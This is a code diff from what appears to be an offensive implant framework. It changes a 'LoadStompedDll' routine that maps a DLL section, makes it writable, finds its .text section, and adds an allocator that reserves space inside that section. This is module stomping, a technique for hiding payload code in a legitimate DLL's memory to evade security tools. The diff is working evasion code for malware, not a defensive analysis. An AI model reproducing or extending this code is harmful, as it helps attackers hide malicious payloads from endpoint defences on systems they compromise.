@@ -29,7 +29,15 @@ BOOL Modules::LoadStompedDll() {
 		return FALSE;
 	}
 
-	stat = kratos->apis.NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &ViewSize, 1, 0, PAGE_READONLY);
+	stat = kratos->apis.NtMapViewOfSection(hSection, GetCurrentProcess(), &pBase, 0, 0, NULL, &ViewSize, ViewShare, 0, PAGE_READONLY);
+	if (!NTAPI_SUCCESS(stat)) {
+		kratos->apis.CloseHandle(hFile);
+		kratos->apis.CloseHandle(hSection);
+		return FALSE;
+	}
+	DWORD old;
+
+	stat = kratos->apis.NtProtectVirtualMemory(GetCurrentProcess(), &pBase, &ViewSize, PAGE_READWRITE, &old);
 	if (!NTAPI_SUCCESS(stat)) {
 		kratos->apis.CloseHandle(hFile);
 		kratos->apis.CloseHandle(hSection);
@@ -38,8 +46,8 @@ BOOL Modules::LoadStompedDll() {
 
 	SIZE_T TextSize = 0;
 
-	PVOID TextAddress = this->GetStompedDllText(pBase, &TextSize);
-	if ( ! TextAddress) { return FALSE; }
+	if (!this->GetStompedDllText(pBase)) { return FALSE; }
+	this->IsStompedDllLoaded = TRUE;
 
 
 	return TRUE;
@@ -47,17 +55,32 @@ BOOL Modules::LoadStompedDll() {
 }
 
 
-
-PVOID Modules::GetStompedDllText( PVOID DllBase, SIZE_T *TextSize ) {
+BOOL Modules::GetStompedDllText(PVOID DllBase) {
 	PIMAGE_SECTION_HEADER sec = SECTION_HEADER( DllBase );
-	WORD NumberOfSection      = FILE_HEADER   ( DllBase )->NumberOfSections;
-
-
-	for ( DWORD i = 0; i < NumberOfSection; i++ ) {
-		if ( utils::mem::memcmp( sec[ i ].Name, ".text", 5 ) == 5 ) {
-			return ( BYTE * )DllBase + sec[ i ].VirtualAddress;
-			*TextSize = sec[ i ].Misc.VirtualSize;
+	WORD NumberOfSections     = FILE_HEADER(DllBase)->NumberOfSections;
+	BOOL Success = FALSE;
+	for ( DWORD i = 0; i < NumberOfSections; i++ ) {
+		if ( utils::mem::memcmp( sec[ i ].Name, ".text", 5 ) == 0 ) {
+			this->StompedDllText = RVA2VA(PVOID, DllBase, sec[i].VirtualAddress);
+			this->StompedDllTextSize = sec[i].Misc.VirtualSize;
+			Success = TRUE;
 		}
 	}
-	return NULL;
+
+	return Success;
+}
+
+
+
+PVOID Modules::ReserveArena(SIZE_T size) {
+	SIZE_T need = PAGE_ALIGN(size);
+	PVOID cur = this->TextSectionIndex;
+	PVOID end = this->StompedDllText + this->StompedDllTextSize;
+
+	if (!cur || need == 0 || cur + need > end) {
+		return NULL;
+	}
+
+	this->TextSectionIndex = cur + need;
+	return cur;
 }
